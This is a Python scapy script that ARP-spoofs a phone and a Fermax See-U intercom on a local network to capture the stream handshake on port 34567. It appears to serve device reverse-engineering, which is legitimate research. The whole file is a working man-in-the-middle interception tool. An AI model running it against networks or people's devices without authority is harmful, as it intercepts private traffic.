#!/usr/bin/env python3
"""Capture the Fermax See-U stream handshake (port 34567).

Uses ARP spoofing to redirect traffic between the phone and the device
through this Mac, then captures the raw TCP packets on port 34567.

Requirements:
    pip3 install scapy
    Must run with sudo (needs to forge ARP packets).

Usage:
    sudo python3 capture_stream.py <phone_ip> <device_ip>
    e.g. sudo python3 capture_stream.py 192.168.1.165 192.168.1.145
"""

import os
import sys
import threading
import time

from scapy.all import (
    ARP,
    Ether,
    Raw,
    TCP,
    get_if_hwaddr,
    getmacbyip,
    sniff,
    sendp,
    srp1,
)


def get_mac(ip: str, iface: str) -> str:
    """Resolve the MAC for an IP, preferring the system ARP table."""
    import subprocess
    # First check the system ARP table (already populated)
    res = subprocess.run(["arp", "-a"], capture_output=True, text=True)
    for line in res.stdout.splitlines():
        if f"({ip})" in line:
            parts = line.split()
            for p in parts:
                if ":" in p and "-" not in p:
                    return p
    # Fall back to scapy ARP request
    mac = getmacbyip(ip)
    return mac


def verify_reachability(ip: str) -> bool:
    """Check the device is reachable."""
    import subprocess
    res = subprocess.run(["ping", "-c", "1", "-W", "2", ip], capture_output=True, text=True)
    return res.returncode == 0


def arp_spoof(target_ip: str, spoof_ip: str, target_mac: str, our_mac: str, iface: str, stop_event: threading.Event):
    """Continuously send ARP replies claiming our MAC is spoof_ip."""
    pkt = Ether(src=our_mac, dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        psrc=spoof_ip,
        hwdst=target_mac,
        hwsrc=our_mac,
    )
    while not stop_event.is_set():
        sendp(pkt, iface=iface, verbose=0)
        time.sleep(1)


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)
    if os.geteuid() != 0:
        print("ERROR: must run with sudo (needs raw sockets).")
        sys.exit(1)

    phone_ip = sys.argv[1]
    device_ip = sys.argv[2]

    # Detect the active interface
    import subprocess
    res = subprocess.run(["route", "-n", "get", "default"], capture_output=True, text=True)
    iface = None
    for line in res.stdout.splitlines():
        if "interface" in line:
            iface = line.split(":", 1)[1].strip()
            break
    if not iface:
        iface = "en0"
    our_ip = subprocess.run(["ipconfig", "getifaddr", iface], capture_output=True, text=True).stdout.strip()
    our_mac = get_if_hwaddr(iface)

    phone_mac = get_mac(phone_ip, iface)
    device_mac = get_mac(device_ip, iface)

    print(f"Interface : {iface} ({our_ip}, {our_mac})")
    print(f"Phone     : {phone_ip} -> {phone_mac}")
    print(f"Device    : {device_ip} -> {device_mac}")
    print()

    # Verify reachability (helps diagnose the phone/device IPs)
    print(f"[check] device ping : {verify_reachability(device_ip)}")
    print(f"[check] phone ping  : {verify_reachability(phone_ip)}")

    # Verify we can reach both
    if not phone_mac:
        print("WARNING: could not resolve phone MAC. It may be off / on a different network.")
    if not device_mac:
        print("WARNING: could not resolve device MAC.")
        device_mac = "ff:ff:ff:ff:ff:ff"

    # Enable IP forwarding so the Mac relays packets
    os.system("sysctl -w net.inet.ip.forwarding=1 >/dev/null 2>&1")

    stop_event = threading.Event()

    # Spoof phone <-> device in both directions
    threads = []
    if phone_mac:
        # Tell phone that device is at our MAC
        threads.append(threading.Thread(
            target=arp_spoof,
            args=(phone_ip, device_ip, phone_mac, our_mac, iface, stop_event),
            daemon=True,
        ))
    # Tell device that phone is at our MAC
    if device_mac:
        threads.append(threading.Thread(
            target=arp_spoof,
            args=(device_ip, phone_ip, device_mac, our_mac, iface, stop_event),
            daemon=True,
        ))
    for t in threads:
        t.start()

    print(f"\n[+] ARP spoofing active. Open the camera in the See-U app now.")
    print(f"[+] Capturing port 34567 packets to stream_capture.pcap")
    print("[+] Press Ctrl+C to stop.\n")

    packets = []

    def handle(pkt):
        if TCP in pkt and pkt[TCP].dport == 34567 or (TCP in pkt and pkt[TCP].sport == 34567):
            packets.append(pkt)
            data = bytes(pkt[Raw].load) if Raw in pkt else b""
            print(f"  [{pkt[TCP].sport}->{pkt[TCP].dport}] {len(data)}B: {data[:64].hex()}")

    try:
        sniff(iface=iface, prn=handle, store=False)
    except KeyboardInterrupt:
        print("\n[+] Stopped.")

    stop_event.set()
    time.sleep(1)
    os.system("sysctl -w net.inet.ip.forwarding=0 >/dev/null 2>&1")

    if packets:
        from scapy.all import wrpcap
        wrpcap("stream_capture.pcap", packets)
        print(f"\n[+] Saved {len(packets)} packets to stream_capture.pcap")
    else:
        print("\n[-] No port 34567 packets captured. Check that the phone connects directly to the device.")

    # Restore ARP (send a few gratuitous replies to fix caches)
    if phone_mac:
        sendp(Ether(src=our_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2, pdst=phone_ip, psrc=device_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=device_mac or our_mac
        ), iface=iface, verbose=0, count=3)
    if device_mac:
        sendp(Ether(src=our_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2, pdst=device_ip, psrc=phone_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=phone_mac or our_mac
        ), iface=iface, verbose=0, count=3)
    print("[+] ARP restored.")


if __name__ == "__main__":
    main()
